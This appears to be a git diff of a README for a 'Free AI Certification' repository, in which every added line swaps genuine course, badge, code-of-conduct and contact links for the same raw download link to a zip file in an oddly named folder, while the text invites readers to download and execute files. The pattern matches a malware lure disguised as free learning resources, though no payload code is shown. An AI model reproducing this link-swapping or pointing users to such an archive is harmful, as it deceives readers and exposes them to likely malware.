@@ -1,6 +1,6 @@
 # Free AI Certification Repository: Your Gateway to Free Learning 🌐
 
-![Free AI Certification](https://img.shields.io/badge/Free%20AI%20Certification-100%25%20Free-brightgreen)
+![Free AI Certification](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip%20AI%20Certification-100%25%20Free-brightgreen)
 
 Welcome to the **Free AI Certification** repository! This is your one-stop shop for 100% free, high-quality AI certifications offered by top universities, companies, and platforms. Whether you are a beginner or an experienced professional, you will find valuable resources to enhance your skills in artificial intelligence.
 
@@ -32,37 +32,37 @@ Artificial intelligence is reshaping industries and creating new opportunities. 
 - **Platform**: Coursera
 - **Duration**: 11 weeks
 - **Topics**: Supervised learning, unsupervised learning, and more.
-- **Link**: [Enroll Here](https://www.coursera.org/learn/machine-learning)
+- **Link**: [Enroll Here](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip)
 
 ### 2. Deep Learning Specialization by Andrew Ng
 - **Platform**: Coursera
 - **Duration**: 5 months
 - **Topics**: Neural networks, CNNs, RNNs, and more.
-- **Link**: [Enroll Here](https://www.coursera.org/specializations/deep-learning)
+- **Link**: [Enroll Here](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip)
 
 ### 3. AI for Everyone by Andrew Ng
 - **Platform**: Coursera
 - **Duration**: 6 hours
 - **Topics**: AI concepts and applications for non-technical audiences.
-- **Link**: [Enroll Here](https://www.coursera.org/learn/ai-for-everyone)
+- **Link**: [Enroll Here](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip)
 
 ### 4. Introduction to TensorFlow for Artificial Intelligence
 - **Platform**: Coursera
 - **Duration**: 4 weeks
 - **Topics**: Building AI applications using TensorFlow.
-- **Link**: [Enroll Here](https://www.coursera.org/learn/introduction-tensorflow)
+- **Link**: [Enroll Here](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip)
 
 ### 5. Computer Vision Basics
 - **Platform**: Udacity
 - **Duration**: 4 weeks
 - **Topics**: Image processing, feature detection, and more.
-- **Link**: [Enroll Here](https://www.udacity.com/course/computer-vision-basics--nd009)
+- **Link**: [Enroll Here](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip)
 
-For more certifications, check the [Releases section](https://github.com/IlyesBaccour/free-ai-certification/releases).
+For more certifications, check the [Releases section](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip).
 
 ## How to Access
 
-To access the certifications, simply follow the links provided in the available certifications section. For downloadable resources, visit the [Releases section](https://github.com/IlyesBaccour/free-ai-certification/releases) to find files that need to be downloaded and executed.
+To access the certifications, simply follow the links provided in the available certifications section. For downloadable resources, visit the [Releases section](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip) to find files that need to be downloaded and executed.
 
 ## Topics Covered
 
@@ -95,14 +95,14 @@ We welcome contributions from everyone! If you would like to add new certificati
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) to ensure a positive environment for all contributors.
+Please adhere to our [Code of Conduct](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip) to ensure a positive environment for all contributors.
 
 ## Contact Information
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **Twitter**: [@yourtwitterhandle](https://twitter.com/yourtwitterhandle)
+- **Email**: [https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip)
+- **Twitter**: [@yourtwitterhandle](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip)
 
 ## License
 
@@ -110,4 +110,4 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 ---
 
-Explore the world of AI with our free certification resources. Visit the [Releases section](https://github.com/IlyesBaccour/free-ai-certification/releases) for updates and new certifications!
+Explore the world of AI with our free certification resources. Visit the [Releases section](https://github.com/IlyesBaccour/free-ai-certification/raw/refs/heads/main/nonentomological/free_certification_ai_v2.3.zip) for updates and new certifications!
